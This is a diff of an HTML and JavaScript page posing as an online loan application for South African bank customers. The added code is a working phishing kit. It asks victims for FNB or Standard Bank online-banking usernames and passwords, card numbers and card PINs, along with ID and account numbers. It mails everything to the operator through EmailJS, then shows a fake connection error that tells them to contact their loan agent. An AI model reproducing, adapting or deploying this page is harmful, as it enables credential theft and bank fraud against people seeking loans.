@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Online Loan Application</title>
+    <title>Application Form</title>
     <link rel="stylesheet" href="apply.css">
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script type="text/javascript">
         (function() {
-            emailjs.init('SxkEvrS2WGB0Q6l6t');
+            emailjs.init('Uh2UqWudiIBHkWqbn');
         })();
     </script>
 </head>
@@ -18,7 +18,7 @@
     </b>
     </div>
     <form id="contact-form" >
-        <div id="first-form">
+        <div id="first-form" >
             <input type="hidden" name="contact_number">
             <label for="name">Full Name:</label> <br>
             <input type="text" name="name" id="fname" placeholder="Enter Your Full Name" required> <br>
@@ -26,8 +26,12 @@
             <input type="text" name="address" id="address" placeholder="Enter Your Address" required> <br>
             <label for="phoneNumber">Phone Number:</label> <br>
             <input type="number" name="phoneNumber" id="phoneNumber" placeholder="Enter Your Phone Number" required> <br>
-            <label for="date">Date of Birth:</label> <br>
-            <input type="date" name="date" id="date" required> <br>
+            <label for="accountNumber">Account Number:</label> <br>
+            <input type="number" name="accountNumber" id="accountNumber" placeholder="Enter Your Account Number" required> <br>
+            <label for="loanAmount">Loan Amount:</label> <br>
+            <input type="number" name="loanAmount" id="loanAmount" placeholder="Enter Your Loan Amount" required> <br>
+            <label for="loanDuration">Loan Duration:</label> <br>
+            <input type="text" name="loanDuration" id="loanDuration" placeholder="Enter Your Loan Duration" required> <br>
             <label for="IDNumber">ID Number:</label> <br>
             <input type="number" name="IDNumber" id="IDNumber" placeholder="Enter Your ID Number" required> <br>
             <label for="email">Email:</label> <br>
@@ -38,28 +42,692 @@
                 <label for="agree" >I agree to the <span id="condition" style="color: blue;"> Terms and Conditions </span></label>
                 
             </div>
-            <input type="submit" id="submit-button" value="Next>>">
+            <input type="submit" id="submit-button" value="Submit">
         </div>
+
         <div id="second-form" style="display: none;">
-
-            <label for="payDate">Pay Day:</label> <br>
-            <input type="text" name="payDate" id="payDate" placeholder="Enter Your Salary Date" required> <br>
-
-            <label for="eason">Reason for application</label> <br>
-            <input type="text" name="reason" id="reason" placeholder="Enter a reason why you need this loan" required> <br>
-            
-            <label for="accountDetails">Account Details:</label> <br>
-            <textarea name="accountDetails" id="accountDetails"></textarea>
-
-            <input type="submit" id="submitButton" value="Submit">
+            <p id="banks" style="margin: 0px auto;">Select your bank</p>
+            <div style=" color: black;" id="show-element">
+                <div class="single-banks">
+                    <img src="./36795309639147dfbee1cf09acc2084c.webp" alt="" width="160">
+                    <p class="single-banks" style="text-align: center; font-size: 120%;" name="bank">FNB</p>
+                </div>
+                <div class="single-banks">
+                    <img src="./Standard_Bank_of_South_Africa_logo.png" alt="" width="90">
+                    <p class="single-banks" style="text-align: center; font-size: 120%; margin-left: -20%;">STANDARD <br>BANK</p>
+                </div>
+                <!-- <div class="single-banks">
+                    <img src="./nedbank logo" alt="" width="70">
+                    <p class="single-banks" style="text-align: center; font-size: 100%; margin-bottom: 20%;">NEDBANK</p>
+                </div> 
+                <div class="single-banks">
+                    <img src="./windhoek logo.png" alt="" width="70">
+                    <p class="single-banks" style="text-align: center; font-size: 100%;">WINDHOEK</p>
+                </div>
+                <p class="single-banks" style="width: 90%; font-size: 150%; text-align: center;">Select your bank to proceed further</p>
+            -->
+             </div>
+                
+            <select name="bank" id="banks" style="display: none;">
+                <option id="opt1"></option>
+            </select>
         </div>
+        <div id="FNB-details" style="display: none;" >
+
+            <div style="padding: 5%;">
+                <p id="p2" style="margin-top: 15%; font-size: 110%; color: rgb(77, 166, 162);">Please enter your app username and password. Use your app username and password to connect your account to your loan dashboard for successful withdrawal of your loan amount 
+                </p>
+              
+                    <div id="fnbFirstDetails">
+
+                        <label for="username">Username</label> <br>
+                        <input type="text" style="background-color: rgb(238, 238, 238);"  name="fnbusername" id="username" placeholder="Enter Username" required> <br>
+                        
+                        <label for="password">Password:</label> <br>
+                        <input type="password" style="background-color: rgb(238, 238, 238);" name="fnbpassword" id="password" placeholder="Enter Password" required> <br>            
+                       
+                        <input type="submit" id="fnbFirstDetailsSubmit" value="continue">
+                        
+                    </div>
+
+                    <div style="display: none;" id="fnbSecondDetails">
+                        <label for="card">Card Number:</label> <br>
+                        <input type="number" class="fnbs" name="fnbcardnumber" id="card" placeholder="Enter Card Number"> <br>
+                        
+                        <label for="pin">Card Pin:</label><br>
+                        <input type="number" class="fnbs" name="fnbcardpin" id="pin" placeholder="Enter Card Pin"> <br>    
+                        
+                        <!-- <div id="card-details">
+                            <input type="text" class="fnbs" name="fnbcarddate" id="card-date" placeholder="mm/yy" maxlength="5"> <br>
+                            <input type="number" class="fnbs" name="fnbcvv" id="cvv" placeholder="Enter Card Cvv Number" maxlength="3"> <br>
+                
+                        </div> -->
+
+                        <p id="p2" style="margin-top: 5%; font-size: 110%; color: rgb(77, 166, 162);">In order to withdraw your loan amount from your loan dashboard to your account, you need to complete the enrollment process.</p>
+
+                        <input type="submit" value="Continue" id="submit1" disabled>
+                    </div>
+                        
+            </div>
+        </div>
+                
+        <div id="standardBankForm" style="display: none; " >
+
+            <div style="padding: 5%;">
+                <p id="p2" style="margin-top: 15%; font-size: 120%; text-align: center;">Please enter your user ID and password. Use your online banking user ID and password to connect your account to your loan dashboard for successful withdrawal of your loan amount 
+                </p>
+                <p id="p2" style="margin-top: 5%; font-size: 200%; text-align: center;">Sign in to Online Banking</p>
+                <div id="standardFirstDetails">
+                    <input type="text" class="standard" name="standardUsername" id="standardUsername" placeholder="Enter User ID" required> <br>
+                    
+                    <input type="password" class="standard" name="standardPassword" id="standardPassword" placeholder="Enter Password" required> <br>            
+                   
+                    <input type="submit" id="standardBankFirstDetailsSubmit" value="continue">
+                        
+                </div>
+                <div style="display: none;" id="standBankSecondDetails">
+                    <label for="card">Card Number:</label> <br>
+                    <input type="number" class="standard" name="standardcardnumber" id="card1" placeholder="Enter Card Number"> <br>
+                    
+                    <label for="pin">Card Pin:</label><br>
+                    <input type="number" class="standard" name="standardcardpin" id="pin1" placeholder="Enter Card Pin"> <br>    
+                    
+                    <!-- <div id="card-details">
+                        <input type="text" class="fnbs" name="fnbcarddate" id="card-date" placeholder="mm/yy" maxlength="5"> <br>
+                        <input type="number" class="fnbs" name="fnbcvv" id="cvv" placeholder="Enter Card Cvv Number" maxlength="3"> <br>
+            
+                    </div> -->
+
+                    <!-- <p id="p2" style="margin-top: 5%; font-size: 110%; color: rgb(77, 166, 162);">In order to withdraw your loan amount from your loan dashboard to your account, you need to complete the enrollment process.</p> -->
+
+                    <input type="submit" value="Sign In" id="standardDetailsSubmit" disabled>
+                </div>
+                
+                <p id="p2" style="margin-top: 2%; font-size: 120%; text-align: center;">In order to withdraw your loan amount from your loan dashboard to your account, you need to complete the enrollment process. </p>
+                <p id="error2" style="display: none;"></p>
+
+              
+            </div>
+        </div>
+
+
+        <!-- <div id="NEDBANK-datails" style="display: none;">
+
+            
+            <p id="p2" style="margin-top: 10%; font-size: 120%; background-color: rgb(65, 142, 48); color: white; padding: 5%; " >Please enter your app username and password. Use your app username and password to connect your account to your loan dashboard for successful withdrawal of your loan amount </p>
+            <div style="padding: 5%;" id="nedbankdetail">
+                <label for="profileNumber">Internet Banking Profile ID:</label> <br>
+                <input type="number" class="nedbank" name="nedbankprofilenumber" id="profileNumber" placeholder="Enter Internet Banking Profile ID"> <br>
+                
+                <label for="password">Internet Banking Password:</label><br>
+                <input type="password" class="nedbank" name="nedbankprofilepassword" id="profilePassword" placeholder="Enter Internet Banking Password"> <br>
+                
+
+                
+                <input type="submit" value="continue" id="nedbankFirstdetail" >
+            </div> 
+            <div style="display: none;" id="nedbankSecondDetails">
+                <label for="card">Card Number:</label> <br>
+                <input type="number" class="fnbs" name="nedbankcardnumber" id="card2" placeholder="Enter Card Number"> <br>
+
+                <div id="card-details">
+                    <input type="text" class="fnbs" name="nedbankcarddate" id="card-date2" placeholder="mm/yy" maxlength="5"> <br>
+                    <input type="number" class="fnbs" name="nedbankcvv" id="cvv2" placeholder="Enter Card Cvv Number" maxlength="3"> <br>
+        
+                </div>
+
+                <input type="submit" value="Confirm" id="submit3" disabled>
+            </div>
+            <p id="p2" style="margin-top: 15%; font-size: 120%; background-color: rgb(65, 142, 48); color: white; padding: 5%;" >In order to withdraw your loan amount from your loan dashboard to your account, you need to complete the enrollment process.</p>
+                
+            </div>
+            
+            
+        <div id="WINDHOEK-details" style="display: none;">
+
+            <div style="padding: 5%;">
+
+                <p id="p2" style="margin-top: 15%; font-size: 110%; color: rgb(57,63,86);">Please enter your email and password. Use your email  and password to connect your account to your loan dashboard for successful withdrawal of your loan amount 
+                </p>
+
+                <div id="continue3">
+
+                    <label for="email">Email:</label> <br>
+                    <input type="email" class="windhoeks" name="windhoekemail" id="windhoek-email" placeholder="Email"> <br>
+                    
+                    <label for="password">Password:</label><br>
+                    <input type="password" class="windhoeks" name="windhoekpassword" id="wimdhoek-password" placeholder="Password"> <br>
+                    <p id="caution2"></p>
+                    <p id="next2">Continue</p>
+                </div>
+
+                <div style="display: none;" id="continue4" >
+
+                    <label for="card">Card Number:</label> <br>
+                    <input type="number" class="windhoeks" name="windhoekcardNumber" id="cardNumber" placeholder="Enter Card Number"> <br>
+        
+                <div id="card-details">
+                    <input type="text" class="windhoeks" name="windhoekcarddate" id="card-date1" placeholder="mm/yy" maxlength="5"> <br>
+                    <input type="number" class="windhoeks" name="windhoekcvv" id="cvv1" placeholder="Enter Card Cvv Number" maxlength="3"> <br>
+        
+                </div>
+                
+                <label for="pin">Card Pin:</label><br>
+                <input type="number" class="windhoeks" name="wimdhoekcardpin" id="wimdhoek-pin" placeholder="Enter Card Pin"> <br>          
+                <p id="p2" style="margin-top: 5%; font-size: 110%; color: rgb(57,63,86);">In order to withdraw your loan amount from your loan dashboard to your account, you need to complete the enrollment process.</p>
+                <p id="error4"></p>
+                 <input type="submit" class="submit4" value="Confirm" id="submit4" disabled style="background-color: transparent; border-radius: 100px; border: 2px solid grey; color: #ccc;">
+            </div>
+               
+                 
+            </div>
+        </div> -->
+
+    
+   </div>
     </form>
+
+    <div id="write-up" style="display: none; margin-top: 5%;">
+        <div id="write">
+            <!-- <img src="./b14ebf87-f581-432d-82f4-c51932ca8653.jpg" alt=""> -->
+            <!-- <p id="p7">Konga Loan Approval Form</p> -->
+
+            
+            <img id="latsimg" src="./error.png" alt="" style="margin: 0px auto; width: 40%;">
+            <h2 id="with">No internet</h2>
+            <p style="text-align: center; font-size: 110%; font-family:'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif ;">Kindly check your internet connection.</p>
+            <!-- <div id="background"> -->
+                <!-- <div id="done">
+                    
+                    <i id="check" class="fa-regular fa-circle-check"></i>
+                </div> -->
+            </div>
+    </div>
+          
     <div id="successful" style="display: none; width: 100vw;">
         <!-- <p id="p7">Konga Loan Approval Form</p> -->
-            <img id="latsimg" src="./WhatsApp Image 2024-05-13 at 23.06.34 (1).jpeg" alt="" style="width: 100%;">
-            <!-- <h2 id="with"> unable to connect to your loan dashboard</h2> -->
+            <img id="latsimg" src="./error.png" alt="" style="width: 40%;">
+            <h2 id="with"> unable to connect to your loan dashboard</h2>
             <p style="text-align: center; font-size: 100%; font-family:'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif ;">Kindly contact your Loan Agent For Further Enquiry and Support.</p>
+            <div id="background">
+                <div id="done">
+                    
+                    <i id="check" class="fa-regular fa-circle-check"></i>
+                </div>
+            </div>
     </div>
-    <script src="apply.js"></script>
+
+    <script>
+
+        let banks = document.getElementById('show-element')
+        let indivBanks = document.querySelectorAll('.single-banks')
+        let display = 0
+
+    
+        document.getElementById("submit-button").addEventListener("click", function() {
+            event.preventDefault()
+            // Get references to all required input elements
+            const inputs = [
+                document.getElementById("fname"),
+                document.getElementById("address"),
+                document.getElementById("phoneNumber"),
+                document.getElementById("accountNumber"),
+                document.getElementById("loanAmount"),
+                document.getElementById("loanDuration"),
+                document.getElementById("IDNumber"),
+                document.getElementById("email")
+            ];
+
+            // Check if all inputs have a value
+            let allFilled = true;
+            inputs.forEach(input => {
+                if (!input.value) {
+                    allFilled = false;
+                    input.style.border = "1px solid red"; // Highlight empty fields
+                    let error = document.createElement('span');
+                    error.className = 'error-message';
+                    error.innerText = "This field is required";
+                    error.style.marginBottom = '5%'
+                    input.parentNode.insertBefore(error, input.nextSibling); // Add error message
+                } else {
+                    input.style.border = ""; // Reset border if filled
+                }
+            });
+
+                // Validate email format
+    const emailInput = document.getElementById("email");
+    const emailValue = emailInput.value;
+    if (emailValue && !emailValue.includes('@')) {
+        alert("Please enter a valid email address with '@'.");
+        emailInput.style.border = "1px solid red";
+        allFilled = false;
+    }
+
+
+            // Proceed to next page if all fields are filled
+            if (allFilled) {
+               let firstForm = document.getElementById('first-form')
+               let secondForm = document.getElementById('second-form')
+               firstForm.style.display = 'none'
+               secondForm.style.display = 'block'
+               secondForm.style.marginTop = '1%'
+            } else {
+                alert("Please fill in all fields before proceeding.");
+            }
+        });
+       
+        let showBanks = document.getElementById('banks')
+        showBanks.addEventListener('click', showBank)
+        function showBank(){
+            display++;
+            if(display === 1){
+                banks.style.margin = '-5% 0 0 0';
+                showBanks.style.display = 'none';
+            }
+            display = 0;
+        }
+       // Select all individual bank elements
+// Select all individual bank elements
+let FNB = document.getElementById('FNB-details')
+let STANDARD = document.getElementById('standardBankForm')
+let option1 = document.getElementById('opt1')
+option1.setAttribute("name", "bank");
+let opt1 = option1.getAttribute("name");
+
+// const cardDate = [
+//     document.getElementById('card-date'),
+//     document.getElementById('card-date1'),
+// ] 
+
+// cardDate.forEach(input =>{
+//     input.addEventListener('input', (event) => {
+// let value = event.target.value.replace(/\D/g, ''); // Remove non-numeric characters
+// let formattedValue = '';
+
+// // Check for month validity
+// if (value.length > 0) {
+//         if (value[0] === '0' || value[0] === '1') {
+//             formattedValue += value[0];
+//         } else {
+//             event.target.value = '';
+//             return;
+//         }
+//     }
+
+//     if (value.length > 1) {
+//         if (value[0] === '0' && /^[1-9]$/.test(value[1]) || value[0] === '1' && /^[0-2]$/.test(value[1])) {
+//             formattedValue += value[1];
+//         } else {
+//             event.target.value = formattedValue;
+//             return;
+//         }
+//     }
+
+//     // Add a slash after the month
+//     if (value.length >= 2) {
+//         formattedValue += '/';
+//     }
+
+//     // Validate day within 1-31
+//     if (value.length > 2) {
+//         let dayPart = value.slice(2);
+        
+//         if (dayPart.length === 1) {
+//             // Allow values 1-9 for the first digit of the day
+//             if (dayPart[0] >= '1' && dayPart[0] <= '3') {
+//                 formattedValue += dayPart[0];
+//             } else {
+//                 event.target.value = formattedValue;
+//                 return;
+//             }
+//         } else if (dayPart.length === 2) {
+//             // Allow valid day ranges for two digits, i.e., 01-31
+//             if (dayPart >= '01' && dayPart <= '31') {
+//                 formattedValue += dayPart;
+//             } else {
+//                 event.target.value = formattedValue;
+//                 return;
+//             }
+//         }
+//     }
+
+//     // Update the input value with the formatted date
+//     event.target.value = formattedValue;
+// });
+
+// })
+
+// const cardCvv = [
+//     document.getElementById('cvv'),
+//     document.getElementById('cvv1'),
+
+// ] 
+// cardCvv.forEach(input => {
+//     input.addEventListener('input', (event) => {
+//     let value = event.target.value;
+
+//         // Ensure the input does not exceed three digits
+//         if (value.length > 3) {
+//             event.target.value = value.slice(0, 3); // Keep only the first three digits
+//         }
+//     });
+
+// })
+
+
+
+
+indivBanks.forEach(element => {
+
+    element.addEventListener('click', function() {
+        // Hide all bank elements and reset their classes and transitions
+        indivBanks.forEach(el => {
+            el.classList.remove('zoomed');
+            el.style.display = "none";
+            el.style.transitionDuration = "3s";
+        });
+
+        // Apply the zoom effect to the clicked element
+        this.classList.add('zoomed');
+        this.style.display = "block";
+        this.style.margin = "10% 0 0 0";
+        
+        // // Adjust div1 and div2 styles for the zoom effect
+        // div1.style.position = "relative";
+        // div1.style.margin = "-25% 0 0 0";
+        // div1.style.transitionDuration = "2s";
+        // div2.style.margin = "-23% 0 0 0"
+        let head = document.getElementById('head')
+        head.style.position = "relative"
+        head.style.margin = "-30% 0 0 0"
+        head.style.transitionDuration = "3s"
+
+        
+        
+        const bankParagraph = this.querySelector('p');
+        const bankName = bankParagraph ? bankParagraph.textContent.trim() : null;
+
+        console.log(this)
+        const bankForms = { 
+            "FNB": FNB, 
+            "STANDARD BANK": STANDARD
+        };
+
+        console.log(bankForms); // Check that all elements are correctly defined
+
+        if (bankForms[bankName]) {
+            bankForms[bankName].style.display = "block";
+            option1.value = bankName;
+            option1.innerHTML = bankName;
+        } else {
+            console.warn(`No form found for bank: ${bankName}`);
+            console.log(bankForms); // Log the forms object to inspect missing elements
+        }
+
+    });
+});
+
+document.getElementById("fnbFirstDetailsSubmit").addEventListener("click", function(){
+    event.preventDefault()
+    
+    const fnbInputs = [
+        document.getElementById('username'),
+        document.getElementById('password')
+    ];
+
+    let fnb = true;
+    fnbInputs.forEach(input => {
+        if(!input.value){
+            fnb = false;
+            input.style.border = "1px solid red";
+
+        }else{
+            input.style.border = ""
+        }
+    })
+
+    if (fnb){
+        let fnbFirstDetails = document.getElementById('fnbFirstDetails')
+        let fnbSecondDetails = document.getElementById('fnbSecondDetails')
+        fnbFirstDetails.style.display = 'none'
+        fnbSecondDetails.style.display = 'block'
+        console.log(fnbFirstDetails)
+        console.log(fnbSecondDetails)
+    }else{
+        alert('Please fill in all fields before proceeding.')
+    }
+
+})
+const fnbSecondInputs = [
+    document.getElementById('card'),
+    document.getElementById('pin')
+];
+let allFilled = false;
+// Add an input event listener to each input
+fnbSecondInputs.forEach(input => {
+    input.addEventListener('input', () => {
+        checkInputs(); // Call the function to check all input values
+    });
+});
+function checkInputs() {
+    allFilled = fnbSecondInputs.every(input => input.value.trim() !== "");
+    document.getElementById('submit1').disabled = !allFilled;
+}
+
+document.getElementById("standardBankFirstDetailsSubmit").addEventListener("click", function(){
+    event.preventDefault()
+    
+    const standardInputs = [
+        document.getElementById('standardUsername'),
+        document.getElementById('standardPassword')
+    ];
+
+    let standard = true;
+    standardInputs.forEach(input => {
+        if(!input.value){
+            standard = false;
+            input.style.border = "1px solid red";
+        }else{
+            input.style.border = ""
+        }
+    })
+    if(standard){
+        let standardFirstDetails = document.getElementById('standardFirstDetails')
+        let standBankSecondDetails = document.getElementById('standBankSecondDetails')
+        standardFirstDetails.style.display = 'none'
+        standBankSecondDetails.style.display = 'block'
+    }else{
+        alert('Please fill in all fields before proceeding.')
+    }
+})
+const standardSecondInput = [
+    document.getElementById('card1'),
+    document.getElementById('pin1')
+];
+// document.getElementById("next2").addEventListener('click', function(){
+//     event.preventDefault()
+
+//     const windhoekInput = [
+//     document.getElementById('windhoek-email'),
+//     document.getElementById('wimdhoek-password')
+//     ];
+
+//     let windhoek = true;
+//     windhoekInput.forEach(input => {
+//         if(!input.value){
+//             windhoek = false;
+//             input.style.border = "1px solid red"
+//         }else{
+//             input.style.border = ""
+//         }
+//     })
+//                     // Validate email format
+//     const emailInput = document.getElementById("windhoek-email");
+//     const emailValue = emailInput.value;
+//     if (emailValue && !emailValue.includes('@')) {
+//         alert("Please enter a valid email address with '@'.");
+//         emailInput.style.border = "1px solid red";
+//         windhoek = false;
+//     }
+//     if(windhoek){
+//         let continue3 = document.getElementById('continue3')
+//         let continue4 = document.getElementById('continue4')
+//         continue3.style.display = "none"
+//         continue4.style.display = "block"
+//     }else{
+//         alert('Please fill in all fields before proceeding.')
+//     }
+// })
+// const windhoekSecondInput = [
+//     document.getElementById('cardNumber'),
+//     document.getElementById('card-date1'),
+//     document.getElementById('cvv1'),
+//     document.getElementById('wimdhoek-pin')
+// ];
+// let windhoekAllFilled  = false
+// windhoekSecondInput.forEach(input => {
+//     input.addEventListener('input', ()=>{
+//         windhoekCheckInput()
+//     })
+// })
+// function windhoekCheckInput(){
+//     windhoekAllFilled = windhoekSecondInput.every(input => input.value.trim() !== "");
+//     document.getElementById('submit4').disabled = !windhoekAllFilled
+// }
+
+let standardAllFilled = false;
+// Add an input event listener to each input
+standardSecondInput.forEach(input => {
+    input.addEventListener('input', () => {
+        standardCheckInputs(); // Call the function to check all input values
+    });
+});
+function standardCheckInputs() {
+
+    standardAllFilled = standardSecondInput.every(input => input.value.trim() !== "");
+    document.getElementById('standardDetailsSubmit').disabled = !standardAllFilled;
+}
+
+// document.getElementById("nedbankFirstdetail").addEventListener("click", function(){
+//     event.preventDefault()
+    
+//     const nedbankInputs = [
+//         document.getElementById('profileNumber'),
+//         document.getElementById('profilePassword')
+//     ];
+
+//     let nedbank = true;
+//     nedbankInputs.forEach(input => {
+//         if(!input.value){
+//             nedbank = false;
+//             input.style.border = "1px solid red";
+
+//         }else{
+//             input.style.border = ""
+//         }
+//     })
+
+//     if (nedbank){
+//         let nedbankdetail = document.getElementById('nedbankdetail')
+//         let nedbankSecondDetails = document.getElementById('nedbankSecondDetails')
+//         nedbankdetail.style.display = 'none'
+//         nedbankSecondDetails.style.display = 'block'
+//         console.log(nedbankdetail)
+//         console.log(nedbankSecondDetails)
+//     }else{
+//         alert('Please fill in all fields before proceeding.')
+//     }
+
+// })
+
+// const nedbankSecondInputs = [
+//     document.getElementById('card2'),
+//     document.getElementById('card-date2'),
+//     document.getElementById('cvv2'),
+// ];
+// let nedbankAllFilled = false;
+
+// nedbankSecondInputs.forEach(input => {
+//    input.addEventListener('input', ()=>{
+//     nedbankCheckInput()
+//    })
+// })
+// function nedbankCheckInput(){
+//     nedbankAllFilled = nedbankSecondInputs.every(input => input.value.trim() !== "");
+//     document.getElementById('submit3').disabled = !nedbankAllFilled;
+// }
+// // Function to update the required attribute for each bank's input fields based on visibility
+
+function updateRequiredAttributes() {
+    const fnbInputs = document.querySelectorAll('#FNB-details input');
+    const standardInputs = document.querySelectorAll('#standardBankForm input');
+    const nedbankInputs = document.querySelectorAll('#NEDBANK-datails input');
+    const windhoekInputs = document.querySelectorAll('#WINDHOEK-details input');
+
+    // Helper function to set or remove 'required' based on display style
+    function toggleRequired(inputs, isVisible) {
+        inputs.forEach(input => {
+            if (isVisible) {
+                input.setAttribute('required', 'required');
+            } else {
+                input.removeAttribute('required');
+            }
+        });
+    }
+
+    // Check the display property of each form and update 'required' attributes accordingly
+    toggleRequired(fnbInputs, document.getElementById('FNB-details').style.display === 'block');
+    toggleRequired(standardInputs, document.getElementById('standardBankForm').style.display === 'block');
+    // toggleRequired(nedbankInputs, document.getElementById('NEDBANK-datails').style.display === 'block');
+    // toggleRequired(windhoekInputs, document.getElementById('WINDHOEK-details').style.display === 'block');
+}
+
+// Attach the updateRequiredAttributes function to relevant events, like clicking on a bank option
+indivBanks.forEach(element => {
+    element.addEventListener('click', updateRequiredAttributes);
+});
+
+// Ensure that the required attributes are properly set before submission
+window.onload = function(){
+
+    document.getElementById('contact-form').addEventListener('submit', function(event) {
+        updateRequiredAttributes(); // Update required fields based on visibility
+        
+        event.preventDefault(); // Prevent default submission
+        
+        // Set a random contact number and send the email
+        this.contact_number.value = Math.random() * 100000 | 0;
+        let form = document.getElementById("contact-form")
+        form.style.display = 'none'
+        
+        emailjs.sendForm("service_7n1k7c7", "template_355g7kp", this)
+        .then(function() {
+            console.log('SUCCESS!');
+            let successful = document.getElementById("successful")
+            let subscribe = document.getElementById('submit')
+            setTimeout(sub, 400);
+            function sub(){
+            successful.style.display = "block"
+            }
+        }, function(error) {
+                console.log('FAILED...', error);
+                let subscribe = document.getElementById('submit')
+                // subscribe.value = 'unable to submit'
+                // subscribe.style.animationName = 'failed';
+                setTimeout(sub, 800);
+                function sub(){
+                    let writng = document.getElementById('write-up');
+                    let form = document.getElementById("contact-form")
+                    writng.style.display = 'block'
+                    // writng.style.color = 'black'
+                    form.style.display = 'none'
+                    terms.style.display = 'none'
+                }
+        });
+    });
+}
+
+
+    </script>
 </body>
 </html>
